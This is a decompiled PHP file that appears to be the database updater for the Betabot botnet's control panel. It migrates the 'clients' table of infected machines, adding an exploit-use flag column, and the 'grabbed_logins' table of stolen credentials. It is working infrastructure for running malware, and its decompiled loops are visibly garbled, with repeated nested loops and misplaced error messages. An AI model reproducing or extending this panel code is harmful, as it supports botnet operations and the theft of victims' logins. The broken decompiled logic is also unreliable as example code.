<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

define("IN_CORE_INC", 1);
require_once "include/sql.inc";
define("IN_SETUP_FORM", 1);
define("SETTINGS_FILE_NAME", "settings.php");
$iNumTablesModified = (int) 0;
$iActualColCount = (int) 0;
$iNumTablesNeedsUpdate = (int) 0;
$iNumTablesUpdated = (int) 0;
$iNumQueriesExecuted = (int) 0;
$iNumQueriesSucceeded = (int) 0;
$iNumQueriesFailed = (int) 0;
$iNumUnrelatedQueries = (int) 0;
$sqlUpdateResult = NULL;
$sqlCheckLink = NULL;
$bIsQueryTableQuery = true;
$szLastQueryTableName = "";
$iArTableColCount = array("clients" => 54, "grabbed_logins" => 10);
$szArTableUpdateQueries = array("clients#0" => "ALTER TABLE `clients` ADD `CveAttributes` INT UNSIGNED NOT NULL COMMENT 'Flags related to use of exploits' AFTER `DebugAttributes`", "clients#1" => "ALTER TABLE `clients` ADD `PrimaryResolution` INT UNSIGNED NOT NULL COMMENT 'Primary monitor resolution' AFTER `CveAttributes`", "NOTABLE#0" => "ALTER TABLE `grabbed_logins` CHANGE `login_type` `login_type` VARCHAR( 180 ) CHARACTER SET ascii COLLATE ascii_general_ci NOT NULL COMMENT 'Type of login grabbed'");
echo "\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n  <head>\r\n    <meta charset=\"utf-8\">\r\n    <title>Panel Update</title>\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <meta name=\"description\" content=\"\">\r\n    <meta name=\"author\" content=\"\">\r\n\r\n    <!-- Le styles -->\r\n    <link href=\"css/bootstrap.css\" rel=\"stylesheet\">\r\n    <style>\r\n      body {\r\n        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */\r\n      }\r\n    </style>\r\n    <link href=\"css/bootstrap-responsive.css\" rel=\"stylesheet\">\r\n\r\n    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->\r\n    <!--[if lt IE 9]>\r\n      <script src=\"http://html5shim.googlecode.com/svn/trunk/html5.js\"></script>\r\n    <![endif]-->\r\n\r\n    <!-- Le fav and touch icons -->\r\n    <link rel=\"shortcut icon\" href=\"../ico/favicon.ico\">\r\n    <link rel=\"apple-touch-icon-precomposed\" sizes=\"144x144\" href=\"../ico/apple-touch-icon-144-precomposed.png\">\r\n    <link rel=\"apple-touch-icon-precomposed\" sizes=\"114x114\" href=\"../ico/apple-touch-icon-114-precomposed.png\">\r\n    <link rel=\"apple-touch-icon-precomposed\" sizes=\"72x72\" href=\"../ico/apple-touch-icon-72-precomposed.png\">\r\n    <link rel=\"apple-touch-icon-precomposed\" href=\"../ico/apple-touch-icon-57-precomposed.png\">\r\n  </head>\r\n\r\n  <body>\r\n\t";
_obfuscated_0D0618023B0F10342A0B313111313E095B322A1D2D2632_();
if (file_exists(SETTINGS_FILE_NAME) == true && 64 < filesize(SETTINGS_FILE_NAME)) {
    require_once SETTINGS_FILE_NAME;
    $sqlCheckLink = mysql_connect(SQL_SERVER . ":" . SQL_PORT, SQL_USERNAME, SQL_PASSWORD);
    _obfuscated_0D2C22011E33374007050531172A055C3523071B120211_($iNumTablesModified++, "Connection details");
    if ($sqlCheckLink) {
        _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Connected to MySQL server!", false);
    } else {
        _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Error connecting to MySQL server! SQL Error (#" . mysql_errno() . "): " . mysql_error(), true);
    }
    $sqlCheckLink = mysql_select_db(SQL_DATABASE);
    if ($sqlCheckLink) {
        _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Selected Betabot database (Name: " . SQL_DATABASE . ")", false);
    } else {
        _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Failed to select Betabot database (Name: " . SQL_DATABASE . ") SQL Error (#" . mysql_errno() . "): " . mysql_error(), true);
    }
    _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Initiating update &nbsp;<strong>//</strong>&nbsp; v1.8.0.8 &nbsp;<strong>=></strong>&nbsp; 1.8.0.11 (New)", false);
    _obfuscated_0D07011107173C22282E1E0A3C2806341C250834221911_();
    reset($iArTableColCount);
    while (list($szTableName, $iColumnCount) = each($iArTableColCount)) {
        if (0 < strlen($szTableName) && 0 < (int) $iColumnCount) {
            $iActualColCount = _obfuscated_0D0F3233291B1006043B190408272F0C38021506012A32_($szTableName);
            if ($iActualColCount != $iColumnCount) {
                $iNumTablesNeedsUpdate++;
                _obfuscated_0D2C22011E33374007050531172A055C3523071B120211_($iNumTablesModified++, "Updating " . SQL_DATABASE . "." . $szTableName . " (Column count mismatch. Actual column count: " . $iActualColCount . ", expected: " . $iColumnCount . ")");
                $iCurrentFailedQueryCount = $iNumQueriesFailed;
                reset($szArTableUpdateQueries);
                while (list($szQueryTableName, $szUpdateQuery) = each($szArTableUpdateQueries)) {
                    while (list($szQueryTableName, $szUpdateQuery) = each($szArTableUpdateQueries)) {
                        while (list($szQueryTableName, $szUpdateQuery) = each($szArTableUpdateQueries)) {
                            $bIsQueryTableQuery = true;
                            $iIndexSepPos = strpos($szQueryTableName, "#");
                            if ($iIndexSepPos === false) {
                                continue;
                            }
                            $szQueryTableName = substr($szQueryTableName, 0, $iIndexSepPos);
                            if ((int) strcasecmp($szQueryTableName, "NOTABLE") === 0) {
                                $bIsQueryTableQuery = false;
                            }
                            if ((int) strcasecmp($szQueryTableName, $szTableName) === 0 || $bIsQueryTableQuery === false) {
                                if (6 < strlen($szUpdateQuery)) {
                                    $sqlUpdateResult = mysql_query($szUpdateQuery);
                                    $iNumQueriesExecuted += 1;
                                    if (mysql_errno()) {
                                        $iNumQueriesFailed++;
                                        _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Error executing SQL query! SQL Error (#" . mysql_errno() . "): " . mysql_error(), true);
                                    } else {
                                        $iNumQueriesSucceeded++;
                                        if ($bIsQueryTableQuery === false) {
                                            _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Query was successful! (Unrelated to current table)", false);
                                            $iNumUnrelatedQueries++;
                                        } else {
                                            _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Query was successful! New column count: " . _obfuscated_0D0F3233291B1006043B190408272F0C38021506012A32_($szTableName), false);
                                        }
                                    }
                                } else {
                                    $iNumQueriesFailed++;
                                }
                            }
                        }
                        $iNumTablesUpdated++;
                    }
                    _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Table column count is incorrect, but updater was unable to find any <i>valid</i> update queries related to this table. Contact support!", true);
                }
            }
            _obfuscated_0D07011107173C22282E1E0A3C2806341C250834221911_();
        }
    }
    _obfuscated_0D2C22011E33374007050531172A055C3523071B120211_($iNumTablesModified++, "Panel update results");
    if ((int) $iNumTablesNeedsUpdate != 0) {
        if ($iNumTablesNeedsUpdate != $iNumTablesUpdated) {
            _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("<strong>" . $iNumTablesNeedsUpdate . "</strong> table(s) needed adjustments, but only <strong>" . $iNumTablesUpdated . "</strong> table(s) were fully updated!", true);
            _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("SQL Query results: <strong>" . $iNumQueriesExecuted . "</strong> queries executed, <strong>" . $iNumQueriesFailed . "</strong> failed, and <strong>" . $iNumQueriesSucceeded . "</strong> succeeded", true);
            _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("Panel updater failed! <a href=\"" . $_SERVER["REQUEST_URI"] . "\">Run the updater again</a>, and if the problem persists, please contact support!", true);
        } else {
            _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("All <strong>" . $iNumTablesNeedsUpdate . "</strong> table(s) that needed adjustments were successfully updated. Panel is ready to go!", false);
            if (0 < (int) $iNumUnrelatedQueries) {
                _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("An additional <strong>" . $iNumUnrelatedQueries . "</strong> change(s) to various tables were made.", false);
            }
        }
    } else {
        _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_("No tables needed any adjustments. Panel is ready to go!", false);
    }
    _obfuscated_0D07011107173C22282E1E0A3C2806341C250834221911_();
}
echo "<br /><a href=\"index.php\">Click here to return to main panel page</a><br />\r\n";
_obfuscated_0D212E373C1014360C0B252F0C04152E113F285C132601_();
echo "\r\n\r\n    <!-- Le javascript\r\n    ================================================== -->\r\n    <!-- Placed at the end of the document so the pages load faster -->\r\n    <script src=\"js/jquery.js\"></script>\r\n    <script src=\"js/bootstrap-transition.js\"></script>\r\n    <script src=\"js/bootstrap-alert.js\"></script>\r\n    <script src=\"js/bootstrap-modal.js\"></script>\r\n    <script src=\"js/bootstrap-dropdown.js\"></script>\r\n    <script src=\"js/bootstrap-scrollspy.js\"></script>\r\n    <script src=\"js/bootstrap-tab.js\"></script>\r\n    <script src=\"js/bootstrap-tooltip.js\"></script>\r\n    <script src=\"js/bootstrap-popover.js\"></script>\r\n    <script src=\"js/bootstrap-button.js\"></script>\r\n    <script src=\"js/bootstrap-collapse.js\"></script>\r\n    <script src=\"js/bootstrap-carousel.js\"></script>\r\n    <script src=\"js/bootstrap-typeahead.js\"></script>\r\n\r\n  </body>\r\n</html>";
function _obfuscated_0D0F3233291B1006043B190408272F0C38021506012A32_($szTableName)
{
    if (strlen($szTableName) == 0) {
        return 0;
    }
    $_obfuscated_0D2A343607043F093832073923193B1B0F310A17033B11_ = 0;
    $_obfuscated_0D090B0F1C251C245C1C09090C3538193C1018343B3422_ = mysql_query("SHOW COLUMNS FROM " . $szTableName);
    if ($_obfuscated_0D090B0F1C251C245C1C09090C3538193C1018343B3422_ && !mysql_errno()) {
        $_obfuscated_0D2A343607043F093832073923193B1B0F310A17033B11_ = mysql_num_rows($_obfuscated_0D090B0F1C251C245C1C09090C3538193C1018343B3422_);
    }
    return $_obfuscated_0D2A343607043F093832073923193B1B0F310A17033B11_;
}
function _obfuscated_0D0618023B0F10342A0B313111313E095B322A1D2D2632_()
{
    echo "\t<div style=\"margin: auto; margin-top: 7%; width: 1080px;\">\r\n\t\t<div class=\"well\">\r\n";
    return true;
}
function _obfuscated_0D212E373C1014360C0B252F0C04152E113F285C132601_()
{
    echo "\t\t</div>\r\n\t</div>\r\n";
    return true;
}
function _obfuscated_0D2C22011E33374007050531172A055C3523071B120211_($section_index, $section_text)
{
    if ((int) $section_index == 0) {
        echo "\t\t\t<br />\r\n";
    }
    echo "\t\t\t<label class=\"label\">" . $section_text . "</label>\r\n";
    return true;
}
function _obfuscated_0D07011107173C22282E1E0A3C2806341C250834221911_()
{
    echo "\t\t\t<br />\r\n";
}
function _obfuscated_0D1A1A33340A2B342E3431170A343F3503353416282811_($entry_text, $bIsError)
{
    if (strlen($entry_text) == 0) {
        return false;
    }
    $_obfuscated_0D25401432180A211B05250F1625371A1A1E2615091401_ = !$bIsError ? "<font color=\"#339900\">Success</font>" : "<font color=\"#E80000\">Failed</font>";
    echo "\t\t\t<label style=\"font-size: 12px; face: font-family: Tahoma;\">" . $_obfuscated_0D25401432180A211B05250F1625371A1A1E2615091401_ . " :: " . $entry_text . "</label>";
    return true;
}

?>